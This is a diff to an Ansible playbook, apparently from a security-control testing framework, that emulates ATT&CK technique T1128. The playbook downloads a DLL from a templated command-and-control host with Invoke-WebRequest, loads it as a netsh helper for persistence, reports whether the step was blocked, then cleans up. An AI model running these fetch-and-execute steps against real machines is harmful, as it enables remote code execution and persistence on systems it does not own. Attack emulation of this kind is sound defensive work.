@@ -8,31 +8,33 @@
       win_shell: Invoke-WebRequest -Uri http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_dll }} -OutFile C:\temp\{{ cnc_dll }}
       register: command_result
       ignore_errors: yes
-    - fail:
+    - name: check if download successfull
         msg="Playbook Completed#T1128#failed#win#"
       when: command_result.rc == 1
-    - name: execute malicious dll
-      win_command: |
-        cd c:\temp
-        netsh.exe add helper {{ cnc_dll }}
-      ignore_errors: yes
-    - name: Wait before status check
-      wait_for: timeout=10
-      delegate_to: localhost
-    - name: check file exist
-      win_stat:
-        path: c:\temp\evil.txt
-      register: T1128
-    - name: check if playbook was blocked
-      debug: msg="Playbook Completed#T1128#blocked#win#"
-      when: T1128.stat.exists == False
-    - name: check if playbook was successfull
-      debug: msg="Playbook Completed#T1128#passed#win#" 
-      when: T1128.stat.exists
-    - name: cleanup
-      win_command: |
-        del C:\temp\{{ cnc_dll }}
-        del C:\temp\evil.txt
-        netsh.exe del helper {{ cnc_dll }}
-      when: T1128.stat.exists
+    - block:
+      - name: execute malicious dll
+        win_command: |
+          cd c:\temp
+          netsh.exe add helper {{ cnc_dll }}
+        ignore_errors: yes
+      - name: Wait before status check
+        wait_for: timeout=10
+        delegate_to: localhost
+      - name: check file exist
+        win_stat:
+          path: c:\temp\evil.txt
+        register: T1128
+      - name: check if playbook was blocked
+        debug: msg="Playbook Completed#T1128#blocked#win#"
+        when: T1128.stat.exists == False
+      - name: check if playbook was successfull
+        debug: msg="Playbook Completed#T1128#passed#win#" 
+        when: T1128.stat.exists
+      - name: cleanup
+        win_command: |
+          del C:\temp\{{ cnc_dll }}
+          del C:\temp\evil.txt
+          netsh.exe del helper {{ cnc_dll }}
+        when: T1128.stat.exists
+      when: command_result.rc != 1
 
